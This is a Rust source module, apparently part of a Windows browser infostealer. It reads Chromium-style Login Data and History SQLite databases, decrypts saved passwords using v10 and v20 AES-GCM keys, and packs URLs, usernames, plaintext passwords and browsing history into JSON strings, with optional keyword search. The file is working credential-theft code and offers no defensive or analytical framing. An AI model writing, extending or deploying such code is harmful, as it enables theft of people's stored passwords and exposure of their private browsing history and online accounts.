//! SQLite readers for browser Login Data / History databases.

use super::browser_crypto::decrypt_aes_gcm;
use super::escape;

// ── Search helpers ──────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
pub(super) fn search_logins(name: &str, db_path: &str, v10_key: &Option<Vec<u8>>, v20_key: &Option<Vec<u8>>, keyword: &str, items: &mut Vec<String>) {
    let conn = match rusqlite::Connection::open_with_flags(db_path, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY) {
        Ok(c) => c,
        Err(_) => return,
    };

    let mut stmt = match conn.prepare("SELECT origin_url, username_value, password_value FROM logins") {
        Ok(s) => s,
        Err(_) => return,
    };

    let _ = stmt.query_map([], |row| {
        let url: String = row.get(0)?;
        let user: String = row.get(1)?;
        let enc: Vec<u8> = row.get(2)?;
        Ok((url, user, enc))
    }).map(|rows| {
        for row in rows.flatten() {
            let (url, user, enc) = row;
            if enc.len() < 3 { continue; }
            let ver = match (&enc[..3], enc.get(1)) {
                (b"v10", _) => "v10",
                (b"v20", _) => "v20",
                _ => "?",
            };

            let key = if ver == "v20" { v20_key.as_ref() } else { v10_key.as_ref() };
            let pass = key.and_then(|k| decrypt_aes_gcm(&enc, k, false));
            let displayed = pass.unwrap_or_default();

            // Match keyword against url, username, password
            let haystack = format!("{} {} {}", url, user, displayed).to_lowercase();
            if !haystack.contains(keyword) { continue; }

            items.push(format!(
                r#"{{"browser":"{}","type":"password","url":"{}","username":"{}","password":"{}","version":"{}"}}"#,
                escape(name),
                escape(&url),
                escape(&user),
                escape(&displayed),
                ver
            ));
        }
    });
}

#[cfg(target_os = "windows")]
pub(super) fn search_history(name: &str, db_path: &str, keyword: &str, items: &mut Vec<String>) {
    let conn = match rusqlite::Connection::open_with_flags(db_path, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY) {
        Ok(c) => c,
        Err(_) => return,
    };

    let mut stmt = match conn.prepare("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 5000") {
        Ok(s) => s,
        Err(_) => return,
    };

    let _ = stmt.query_map([], |row| {
        let url: String = row.get(0)?;
        let title: String = row.get(1)?;
        let visits: i32 = row.get(2)?;
        Ok((url, title, visits))
    }).map(|rows| {
        for row in rows.flatten() {
            let (url, title, visits) = row;

            // Match keyword against url, title
            let haystack = format!("{} {}", url, title).to_lowercase();
            if !haystack.contains(keyword) { continue; }

            items.push(format!(
                r#"{{"browser":"{}","type":"history","url":"{}","title":"{}","visits":{}}}"#,
                escape(name),
                escape(&url),
                escape(&title),
                visits
            ));
        }
    });
}

// ── SQLite Readers ─────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
pub(super) fn read_logins(name: &str, db_path: &str, v10_key: &Option<Vec<u8>>, v20_key: &Option<Vec<u8>>, items: &mut Vec<String>) {
    let conn = match rusqlite::Connection::open_with_flags(db_path, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY) {
        Ok(c) => c,
        Err(_) => return,
    };

    let mut stmt = match conn.prepare("SELECT origin_url, username_value, password_value FROM logins") {
        Ok(s) => s,
        Err(_) => return,
    };

    let _ = stmt.query_map([], |row| {
        let url: String = row.get(0)?;
        let user: String = row.get(1)?;
        let enc: Vec<u8> = row.get(2)?;
        Ok((url, user, enc))
    }).map(|rows| {
        for row in rows.flatten() {
            let (url, user, enc) = row;
            if enc.len() < 3 { continue; }
            let ver = match (&enc[..3], enc.get(1)) {
                (b"v10", _) => "v10",
                (b"v20", _) => "v20",
                _ => "?",
            };

            let key = if ver == "v20" { v20_key.as_ref() } else { v10_key.as_ref() };
            let pass = key.and_then(|k| decrypt_aes_gcm(&enc, k, false));

            // Skip entries where password is empty
            let displayed = pass.unwrap_or_default();
            if displayed.is_empty() {
                continue;
            }

            items.push(format!(
                r#"{{"browser":"{}","type":"password","url":"{}","username":"{}","password":"{}","version":"{}"}}"#,
                escape(name),
                escape(&url),
                escape(&user),
                escape(&displayed),
                ver
            ));
        }
    });
}

#[cfg(target_os = "windows")]
pub(super) fn read_history(name: &str, db_path: &str, items: &mut Vec<String>) {
    let conn = match rusqlite::Connection::open_with_flags(db_path, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY) {
        Ok(c) => c,
        Err(_) => return,
    };

    let mut stmt = match conn.prepare("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 500") {
        Ok(s) => s,
        Err(_) => return,
    };

    let _ = stmt.query_map([], |row| {
        let url: String = row.get(0)?;
        let title: String = row.get(1)?;
        let visits: i32 = row.get(2)?;
        Ok((url, title, visits))
    }).map(|rows| {
        for row in rows.flatten() {
            let (url, title, visits) = row;

            // Skip entries where url is empty
            if url.is_empty() {
                continue;
            }

            items.push(format!(
                r#"{{"browser":"{}","type":"history","url":"{}","title":"{}","visits":{}}}"#,
                escape(name),
                escape(&url),
                escape(&title),
                visits
            ));
        }
    });
}
